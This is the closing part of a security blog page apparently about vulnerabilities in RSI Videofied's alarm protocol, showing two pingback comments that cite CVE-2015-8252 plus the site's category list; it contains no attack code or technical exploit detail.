     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.


